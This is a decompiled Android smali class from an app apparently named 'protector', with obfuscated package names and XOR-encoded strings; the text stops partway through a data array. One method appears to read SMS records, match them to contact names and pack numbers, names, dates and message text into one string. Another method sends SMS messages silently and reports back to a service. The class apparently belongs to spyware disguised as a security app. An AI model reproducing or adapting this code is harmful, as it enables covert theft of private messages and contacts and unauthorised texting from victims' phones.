.class public abstract Lcom/icontrol/protector/m;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public static a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 24

    .line 1
    move-object/from16 v0, p1

    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    :try_start_0
    new-instance v4, Ljava/lang/StringBuffer;

    invoke-direct {v4}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    const/16 v7, 0xe

    new-array v7, v7, [B

    fill-array-data v7, :array_2

    new-array v8, v3, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    const/4 v8, 0x5

    new-array v9, v8, [B

    fill-array-data v9, :array_4

    new-array v10, v3, [B

    fill-array-data v10, :array_5

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_0

    const/16 v0, 0x13

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v7, v3, [B

    fill-array-data v7, :array_7

    invoke-static {v0, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_0
    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    goto :goto_1

    :cond_0
    new-array v9, v1, [B

    fill-array-data v9, :array_8

    new-array v10, v3, [B

    fill-array-data v10, :array_9

    invoke-static {v9, v10}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v0, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const/16 v0, 0x12

    new-array v0, v0, [B

    fill-array-data v0, :array_a

    new-array v7, v3, [B

    fill-array-data v7, :array_b

    invoke-static {v0, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_1
    :goto_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v9

    const/4 v0, 0x7

    new-array v11, v0, [Ljava/lang/String;

    const/4 v15, 0x3

    new-array v10, v15, [B

    fill-array-data v10, :array_c

    new-array v12, v3, [B

    fill-array-data v12, :array_d

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/4 v14, 0x0

    aput-object v10, v11, v14

    const/16 v13, 0x9

    new-array v10, v13, [B

    fill-array-data v10, :array_e

    new-array v12, v3, [B

    fill-array-data v12, :array_f

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/16 v16, 0x1

    aput-object v10, v11, v16

    new-array v10, v0, [B

    fill-array-data v10, :array_10

    new-array v12, v3, [B

    fill-array-data v12, :array_11

    invoke-static {v10, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v10

    const/4 v12, 0x2

    aput-object v10, v11, v12

    const/4 v10, 0x6

    new-array v12, v10, [B

    fill-array-data v12, :array_12

    new-array v13, v3, [B

    fill-array-data v13, :array_13

    invoke-static {v12, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    aput-object v12, v11, v15

    new-array v12, v1, [B

    fill-array-data v12, :array_14

    new-array v13, v3, [B

    fill-array-data v13, :array_15

    invoke-static {v12, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    aput-object v12, v11, v1

    new-array v12, v1, [B

    fill-array-data v12, :array_16

    new-array v13, v3, [B

    fill-array-data v13, :array_17

    invoke-static {v12, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    aput-object v12, v11, v8

    new-array v12, v1, [B

    fill-array-data v12, :array_18

    new-array v13, v3, [B

    fill-array-data v13, :array_19

    invoke-static {v12, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    aput-object v12, v11, v10

    const/4 v12, 0x0

    const/4 v13, 0x0

    const/16 v17, 0x0

    move v8, v10

    move-object v10, v7

    const/4 v15, 0x2

    move v15, v14

    move-object/from16 v14, v17

    invoke-virtual/range {v9 .. v14}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v9

    new-array v10, v0, [Ljava/lang/String;

    new-array v0, v0, [B

    fill-array-data v0, :array_1a

    new-array v11, v3, [B

    fill-array-data v11, :array_1b

    invoke-static {v0, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v10, v15

    new-array v0, v8, [B

    fill-array-data v0, :array_1c

    new-array v11, v3, [B

    fill-array-data v11, :array_1d

    invoke-static {v0, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v10, v16

    new-array v0, v1, [B

    fill-array-data v0, :array_1e

    new-array v11, v3, [B

    fill-array-data v11, :array_1f

    invoke-static {v0, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v11, 0x2

    aput-object v0, v10, v11

    new-array v0, v1, [B

    fill-array-data v0, :array_20

    new-array v11, v3, [B

    fill-array-data v11, :array_21

    invoke-static {v0, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v11, 0x3

    aput-object v0, v10, v11

    new-array v0, v11, [B

    fill-array-data v0, :array_22

    new-array v11, v3, [B

    fill-array-data v11, :array_23

    invoke-static {v0, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v10, v1

    new-array v0, v1, [B

    fill-array-data v0, :array_24

    new-array v1, v3, [B

    fill-array-data v1, :array_25

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x5

    aput-object v0, v10, v1

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_26

    new-array v1, v3, [B

    fill-array-data v1, :array_27

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v10, v8

    if-eqz v9, :cond_5

    invoke-interface {v9}, Landroid/database/Cursor;->getCount()I

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    if-lez v0, :cond_5

    :try_start_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v18

    sget-object v19, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/16 v20, 0x0

    const/16 v1, 0x32

    new-array v1, v1, [B

    fill-array-data v1, :array_28

    new-array v8, v3, [B

    fill-array-data v8, :array_29

    invoke-static {v1, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v21

    const/4 v1, 0x2

    new-array v8, v1, [Ljava/lang/String;

    const/16 v1, 0x20

    new-array v11, v1, [B

    fill-array-data v11, :array_2a

    new-array v12, v3, [B

    fill-array-data v12, :array_2b

    invoke-static {v11, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    aput-object v11, v8, v15

    new-array v1, v1, [B

    fill-array-data v1, :array_2c

    new-array v11, v3, [B

    fill-array-data v11, :array_2d

    invoke-static {v1, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    aput-object v1, v8, v16

    const/16 v1, 0xa

    new-array v1, v1, [B

    fill-array-data v1, :array_2e

    new-array v11, v3, [B

    fill-array-data v11, :array_2f

    invoke-static {v1, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v23

    move-object/from16 v22, v8

    invoke-virtual/range {v18 .. v23}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    const/4 v8, 0x0

    :goto_2
    :try_start_2
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v11

    if-eqz v11, :cond_2

    const/16 v11, 0xc

    new-array v11, v11, [B

    fill-array-data v11, :array_30

    new-array v12, v3, [B

    fill-array-data v12, :array_31

    invoke-static {v11, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-interface {v1, v11}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v11

    invoke-interface {v1, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    const/4 v11, 0x5

    new-array v12, v11, [B

    fill-array-data v12, :array_32

    new-array v13, v3, [B

    fill-array-data v13, :array_33

    invoke-static {v12, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-interface {v1, v12}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v12

    invoke-interface {v1, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v12}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-virtual {v6, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_2

    :catch_0
    const/4 v8, 0x0

    :catch_1
    :cond_2
    move v14, v15

    :goto_3
    :try_start_3
    invoke-interface {v9}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_5

    aget-object v1, v10, v15

    invoke-interface {v9, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v9, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const/4 v11, 0x2

    aget-object v12, v10, v11

    invoke-interface {v9, v12}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v12

    invoke-interface {v9, v12}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v12

    const/16 v16, 0x3

    aget-object v0, v10, v16

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v9, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    new-instance v11, Ljava/util/Date;

    invoke-direct {v11, v12, v13}, Ljava/util/Date;-><init>(J)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :try_start_4
    invoke-virtual {v5, v1}, Ljava/util/ArrayList;->indexOf(Ljava/lang/Object;)I

    move-result v12

    const/4 v13, -0x1

    if-eq v12, v13, :cond_3

    invoke-virtual {v6, v12}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_4

    :cond_3
    const/4 v12, 0x0

    :goto_4
    move-object v8, v12

    :catch_2
    :try_start_5
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v12

    const/16 v13, 0xf

    if-le v12, v13, :cond_4

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v15, v13}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v13, 0x3

    new-array v15, v13, [B

    fill-array-data v15, :array_34

    new-array v13, v3, [B

    fill-array-data v13, :array_35

    invoke-static {v15, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    goto :goto_5

    :cond_4
    move-object v12, v0

    :goto_5
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/util/Date;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v13, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->j:Ljava/lang/String;

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v14}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->i:Ljava/lang/String;

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    add-int/lit8 v14, v14, 0x1

    const/4 v15, 0x0

    goto/16 :goto_3

    :cond_5
    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    return-object v0

    :catch_3
    return-object v2

    :array_0
    .array-data 1
        -0x5at
        -0x29t
        -0x28t
        -0x18t
    .end array-data

    :array_1
    .array-data 1
        -0x38t
        -0x5et
        -0x4ct
        -0x7ct
        -0x80t
        -0x67t
        -0x3ft
        0x31t
    .end array-data

    :array_2
    .array-data 1
        0x51t
        -0x5ct
        0x62t
        0x12t
        -0x5t
        -0x45t
        0x41t
        -0xft
        0x1dt
        -0x1ct
        0x7ft
        0xbt
        -0x13t
        -0x6t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x32t
        -0x35t
        0xct
        0x66t
        -0x62t
        -0x2bt
        0x35t
        -0x35t
    .end array-data

    :array_4
    .array-data 1
        -0x54t
        -0x2dt
        0x23t
        -0x7et
        0x3t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x1bt
        -0x43t
        0x41t
        -0x13t
        0x7bt
        -0x66t
        -0x10t
        0x12t
    .end array-data

    :array_6
    .array-data 1
        0x20t
        0x53t
        -0x7ft
        -0x68t
        -0x4dt
        0x35t
        -0x3dt
        0x6at
        0x6ct
        0x13t
        -0x64t
        -0x7ft
        -0x5bt
        0x74t
        -0x22t
        0x3et
        0x21t
        0x53t
        -0x69t
    .end array-data

    :array_7
    .array-data 1
        0x43t
        0x3ct
        -0x11t
        -0x14t
        -0x2at
        0x5bt
        -0x49t
        0x50t
    .end array-data

    :array_8
    .array-data 1
        -0x77t
        0x70t
        -0x72t
        -0x7ct
    .end array-data

    :array_9
    .array-data 1
        -0x26t
        0x15t
        -0x20t
        -0x10t
        0x59t
        0x13t
        0x72t
        0x25t
    .end array-data

    :array_a
    .array-data 1
        -0x19t
        0x5ct
        -0x5ft
        -0x22t
        0x1ct
        0x67t
        -0x54t
        -0x4ft
        -0x55t
        0x1ct
        -0x44t
        -0x39t
        0xat
        0x26t
        -0x55t
        -0x12t
        -0x16t
        0x47t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x7ct
        0x33t
        -0x31t
        -0x56t
        0x79t
        0x9t
        -0x28t
        -0x75t
    .end array-data

    :array_c
    .array-data 1
        -0x44t
        -0x5et
        0x64t
    .end array-data

    :array_d
    .array-data 1
        -0x1dt
        -0x35t
        0x0t
        -0x61t
        0x3et
        -0x63t
        -0x35t
        -0xat
    .end array-data

    :array_e
    .array-data 1
        0x42t
        -0x27t
        0x60t
        -0x1bt
        0x17t
        -0x1ct
        -0x11t
        0x22t
        0x52t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x36t
        -0x4ft
        0x12t
        -0x80t
        0x76t
        -0x80t
        -0x50t
        0x4bt
    .end array-data

    :array_10
    .array-data 1
        -0x32t
        0x4et
        -0x23t
        0x41t
        -0x56t
        -0x11t
        -0x6at
    .end array-data

    :array_11
    .array-data 1
        -0x51t
        0x2at
        -0x47t
        0x33t
        -0x31t
        -0x64t
        -0x1bt
        -0x17t
    .end array-data

    :array_12
    .array-data 1
        0x2ct
        -0x37t
        -0x26t
        -0x3t
        -0x21t
        0x28t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x5ct
        -0x54t
        -0x58t
        -0x72t
        -0x50t
        0x46t
        -0x12t
        0x2dt
    .end array-data

    :array_14
    .array-data 1
        -0x35t
        0x3et
        0x52t
        0x49t
    .end array-data

    :array_15
    .array-data 1
        -0x51t
        0x5ft
        0x26t
        0x2ct
        0x66t
        -0x34t
        0x29t
        0x22t
    .end array-data

    :array_16
    .array-data 1
        -0x1at
        -0x21t
        0x3bt
        -0x2t
    .end array-data

    :array_17
    .array-data 1
        -0x7ct
        -0x50t
        0x5ft
        -0x79t
        -0x77t
        -0x70t
        -0x4ft
        0x32t
    .end array-data

    :array_18
    .array-data 1
        0x51t
        -0x3at
        0x35t
        0x2dt
    .end array-data

    :array_19
    .array-data 1
        0x25t
        -0x41t
        0x45t
        0x48t
        0x9t
        -0x54t
        0x57t
        0x49t
    .end array-data

    :array_1a
    .array-data 1
        -0x30t
        -0x30t
        -0x7ct
        0x76t
        0x3t
        -0x52t
        -0x57t
    .end array-data

    :array_1b
    .array-data 1
        -0x4ft
        -0x4ct
        -0x20t
        0x4t
        0x66t
        -0x23t
        -0x26t
        0x32t
    .end array-data

    :array_1c
    .array-data 1
        0xet
        0x63t
        -0x78t
        0x4ft
        -0x14t
        -0x1dt
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x7et
        0x6t
        -0x6t
        0x3ct
        -0x7dt
        -0x73t
        -0x2ft
        0x42t
    .end array-data

    :array_1e
    .array-data 1
        -0x5ft
        0x37t
        0x6at
        0x29t
    .end array-data

    :array_1f
    .array-data 1
        -0x3bt
        0x56t
        0x1et
        0x4ct
        -0x1t
        0x41t
        0x8t
        -0x1bt
    .end array-data

    :array_20
    .array-data 1
        0x13t
        -0x4ft
        0x33t
        -0x3t
    .end array-data

    :array_21
    .array-data 1
        0x71t
        -0x22t
        0x57t
        -0x7ct
        0x0t
        -0x64t
        -0x9t
        -0x7t
    .end array-data

    :array_22
    .array-data 1
        -0x42t
        -0x9t
        0x7et
    .end array-data

    :array_23
    .array-data 1
        -0x1ft
        -0x62t
        0x1at
        0x70t
        0x15t
        0x68t
        0x2bt
        0x58t
    .end array-data

    :array_24
    .array-data 1
        -0x6ft
        -0x4bt
        0x3t
        -0x16t
    .end array-data

    :array_25
    .array-data 1
        -0x1bt
        -0x34t
        0x73t
        -0x71t
        0x3et
        0x28t
        0x2et
        -0x78t
    .end array-data

    :array_26
    .array-data 1
        0x6bt
        0x29t
        -0x27t
        -0x33t
        0x66t
        -0x34t
        0x5ft
        0x44t
        0x7bt
    .end array-data

    nop

    :array_27
    .array-data 1
        0x1ft
        0x41t
        -0x55t
        -0x58t
        0x7t
        -0x58t
        0x0t
        0x2dt
    .end array-data

    :array_28
    .array-data 1
        0x54t
        0x6bt
        0x4ct
        0x6dt
        0x2dt
        0x4et
        -0x6dt
        0x4t
        0x59t
        0x55t
        0x51t
        0x47t
        0x30t
        0x44t
        -0x67t
        0x18t
        0x1dt
        0x37t
        0xft
        0x12t
        0x1ct
        0x68t
        -0x48t
        0x4at
        0x14t
        0x67t
        0x56t
        0x5ft
        0x38t
        0x52t
        -0x7bt
        0x1at
        0x59t
        0x37t
        0x0t
        0x12t
        0x12t
        0x74t
        -0x24t
        0x7t
        0x55t
        0x67t
        0x5at
        0x46t
        0x24t
        0x56t
        -0x67t
        0x57t
        0x3t
        0x23t
    .end array-data

    nop

    :array_29
    .array-data 1
        0x3ct
        0xat
        0x3ft
        0x32t
        0x5dt
        0x26t
        -0x4t
        0x6at
    .end array-data

    :array_2a
    .array-data 1
        -0x30t
        0x5ft
        0x4ft
        0x9t
        -0x21t
        -0x2dt
        0x6at
        -0x1bt
        -0x37t
        0x58t
        0x4ft
        0x9t
        -0x23t
        -0x38t
        0x7ct
        -0x1ct
        -0x37t
        0x43t
        0x5t
        0x4et
        -0x36t
        -0x28t
        0x63t
        -0x48t
        -0x3dt
        0x5ct
        0x4at
        0x4et
        -0x2et
        -0x1et
        0x78t
        -0x5bt
    .end array-data

    :array_2b
    .array-data 1
        -0x5at
        0x31t
        0x2bt
        0x27t
        -0x42t
        -0x43t
        0xet
        -0x69t
    .end array-data

    :array_2c
    .array-data 1
        -0x35t
        -0x2et
        0x44t
        -0x16t
        0x49t
        0x8t
        -0x25t
        -0x4et
        -0x2et
        -0x2bt
        0x44t
        -0x16t
        0x4bt
        0x13t
        -0x33t
        -0x4dt
        -0x2et
        -0x32t
        0xet
        -0x53t
        0x5ct
        0x3t
        -0x2et
        -0x11t
        -0x33t
        -0x2ct
        0x4ft
        -0x56t
        0x4dt
        0x39t
        -0x37t
        -0xet
    .end array-data

    :array_2d
    .array-data 1
        -0x43t
        -0x44t
        0x20t
        -0x3ct
        0x28t
        0x66t
        -0x41t
        -0x40t
    .end array-data

    :array_2e
    .array-data 1
        -0x17t
        0x31t
        0x6t
        -0x40t
        -0x29t
        0x15t
        -0x36t
        -0x19t
        -0x1dt
        0x3at
    .end array-data

    nop

    :array_2f
    .array-data 1
        -0x76t
        0x5et
        0x68t
        -0x4ct
        -0x4at
        0x76t
        -0x42t
        -0x48t
    .end array-data

    :array_30
    .array-data 1
        0x60t
        -0x5et
        -0x2dt
        0x7dt
        0x4t
        0x74t
        0x58t
        0x6dt
        0x6at
        -0x56t
        -0x33t
        0x68t
    .end array-data

    :array_31
    .array-data 1
        0x4t
        -0x35t
        -0x60t
        0xdt
        0x68t
        0x15t
        0x21t
        0x32t
    .end array-data

    :array_32
    .array-data 1
        -0x2at
        0x32t
        0x10t
        0x1at
        0x58t
    .end array-data

    nop

    :array_33
    .array-data 1
        -0x4et
        0x53t
        0x64t
        0x7bt
        0x69t
        -0x71t
        -0x4at
        0x3et
    .end array-data

    :array_34
    .array-data 1
        -0x8t
        0x35t
        0x46t
    .end array-data

    :array_35
    .array-data 1
        -0x2at
        0x1bt
        0x68t
        -0x65t
        0x5ft
        -0x4bt
        0x73t
        0x3bt
    .end array-data
.end method

.method public static b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8

    .line 1
    const/16 v0, 0xb

    const/16 v1, 0x8

    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    const/4 v4, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    move-object v3, p1

    move-object v5, p2

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p2, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    const/16 v2, 0x11

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p0, p2, v2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v2, v1, [B

    fill-array-data v2, :array_5

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const/16 p2, 0x16

    new-array p2, p2, [B

    fill-array-data p2, :array_6

    new-array v0, v1, [B

    fill-array-data v0, :array_7

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-static {p0, p1, p2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    return-void

    :array_0
    .array-data 1
        0x64t
        -0x37t
        0x46t
        -0x22t
        -0x12t
        0x2t
        -0x66t
        0x1ct
        0x5dt
        -0x3dt
        0x15t
    .end array-data

    :array_1
    .array-data 1
        0x29t
        -0x54t
        0x35t
        -0x53t
        -0x71t
        0x65t
        -0x1t
        0x3ct
    .end array-data

    :array_2
    .array-data 1
        -0x5et
        -0x39t
        -0x30t
        -0x64t
        -0x23t
        0x3ct
        0x45t
        -0x4bt
        -0x6et
        -0x39t
        -0x33t
        -0x65t
        -0x65t
        0x1at
        0x5ct
        -0x46t
        -0x78t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0xft
        -0x5et
        -0x42t
        -0x18t
        -0x3t
        0x6ft
        0x30t
